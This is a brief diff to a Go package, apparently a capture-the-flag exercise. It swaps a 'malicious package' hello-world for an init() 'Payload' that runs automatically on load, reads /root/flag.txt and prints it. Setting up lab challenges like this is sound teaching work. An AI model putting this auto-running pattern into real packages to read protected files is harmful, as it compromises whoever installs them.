@@ -1,7 +1,16 @@
 package main
 
-import "fmt"
+import (
+    "fmt"
+    "os"
+)
 
-func main() {
-    fmt.Println("Hello from malicious package!")
+func init() {
+    // Payload: read the flag and print it
+    data, err := os.ReadFile("/root/flag.txt")
+    if err != nil {
+        fmt.Println("[!] Failed to read flag:", err)
+        return
+    }
+    fmt.Println("🏴 FLAG:", string(data))
 }
